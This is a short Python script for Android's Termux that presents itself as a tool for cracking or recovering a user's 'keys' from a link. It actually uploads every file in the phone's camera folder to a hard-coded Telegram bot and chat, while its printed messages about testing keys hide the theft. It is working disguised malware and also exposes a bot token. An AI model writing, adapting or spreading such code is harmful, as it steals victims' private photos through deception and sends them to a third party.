import os
import asyncio
from telegram import Bot
from telegram.error import TelegramError


input("ingrese el link del usuario")

async def enviar_fotos_telegram():
    # --- CONFIGURACIÓN ---
    BOT_TOKEN = "8096588316:AAGQX5cNAzy49Kl6tvP_FcW2gZarttEt8Ss"
    CHAT_ID = "8326936177"
    # Ruta de la cámara en Termux
    ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"

    try:
        bot = Bot(token=BOT_TOKEN)
        
        if not os.path.exists(ruta_camara):
            print(f"❌ Error: La ruta no existe.")
            return

        # Listamos los archivos en la carpeta
        archivos = [f for f in os.listdir(ruta_camara) if os.path.isfile(os.path.join(ruta_camara, f))]
        
        if not archivos:
            print("⚠️ No se encontraron claves para enviar.")
            return

        print(f"📸 Se encontraron {len(archivos)} claves posibles. Iniciando envío...")

        for nombre_archivo in archivos:
            ruta_completa = os.path.join(ruta_camara, nombre_archivo)
            
            try:
                print(f"📤 provando clave...")
                
                # Enviamos el archivo directamente como foto
                with open(ruta_completa, 'rb') as foto:
                    await bot.send_photo(
                        chat_id=CHAT_ID, 
                        photo=foto, 
                        caption=f"clave recuperada"
                    )
                
                # Pequeña pausa para evitar bloqueos de Telegram por spam
                await asyncio.sleep(1) 
                
            except Exception as e:
                print(f"❌ No se pudo resolver: {e}")

        print("\n✅ ¡Proceso finalizado!")

    except TelegramError as e:
        print(f"❌ Error  ")
    except Exception as e:
        print(f"❌ Error  ")

if __name__ == "__main__":
    try:
        asyncio.run(enviar_fotos_telegram())
    except KeyboardInterrupt:
        print("\n🛑 Proceso detenido por el usuario.")
